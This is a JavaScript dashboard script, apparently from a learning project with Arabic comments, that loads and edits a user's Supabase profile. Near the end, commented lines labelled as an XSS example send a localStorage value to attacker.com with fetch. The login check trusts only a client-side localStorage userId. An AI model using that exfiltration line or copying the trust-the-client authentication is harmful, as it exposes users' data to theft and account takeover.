const welcomeMsg = document.getElementById("welcome-msg");
const userName = document.getElementById("user-name");
const userEmail = document.getElementById("user-email");
const userAge = document.getElementById("user-age");
const userPhone = document.getElementById("user-phone");
const LogoutBtn = document.getElementById("btn-logout");

// اقسام الصفحة
const viewSection = document.getElementById("view-section");
const editSection = document.getElementById("edit-section");
// Update in db
const editName = document.getElementById("edit-name");
const editAge = document.getElementById("edit-age");
const editPhone = document.getElementById("edit-phone");
// الازرار
const editBtn = document.getElementById("btn-edit");
const saveBtn = document.getElementById("btn-save");
const cancelBtn = document.getElementById("btn-cancel");
const deleteBtn = document.getElementById("btn-delete");

// تخزين بيانات المستخدم الحالية
let currentUser = null;
let currentUserId = null;

//Event Listeners
editBtn.addEventListener("click", openEditMode);
// cancelBtn.addEventListener("click", cancelEditMode);
// saveBtn.addEventListener("click", updateUserData);
// deleteBtn.addEventListener("click", deleteUser);
LogoutBtn.addEventListener("click", logout);

initDashboard();

async function initDashboard() {
  currentUserId = checkLogin();
  if (currentUserId) {
    await loadUserData(currentUserId);
  }
}

// داله التحقق وحمايه الصفحة
function checkLogin() {
  const userId = localStorage.getItem("userId");
  if (!userId) {
    window.location.href = "login.html";
    return null;
  }
  return userId;
}

function logout() {
  localStorage.removeItem("userId");
  alert("تم تسجيل الخروج");
  window.location.href = "index.html";
}

// داله عرض البيانات ولو البييانات غير صحيحه رجع المستخدم لصفحه الاندكس
async function loadUserData(userId) {
  const { data, error } = await supabaseClient
    .from("users")
    .select("*")
    .eq("userId", userId)
    .single();

  if (error || !data) {
    alert("حدث خطأ في تحميل البيانات");
    logout();
    return;
  }

  currentUser = data;
  showUserData(data);
}

function showUserData(user) {
  welcomeMsg.textContent = `مرحبا بك يا ${user.name}`;
  userName.textContent = user.name;
  userEmail.textContent = user.email;
  userAge.textContent = user.age;
  userPhone.textContent = user.phone;
}

// XSS Cross-Site-scripting
// const stolenData = localStorage.getItem("userID")
// fetch("https://attacker.com/steal?data=" + stolenData)

function openEditMode() {
  editName.value = currentUser.name;
  editAge.value = currentUser.age;
  editPhone.value = currentUser.phone;

  viewSection.style.display = "none";
  editSection.style.display = "block";
}
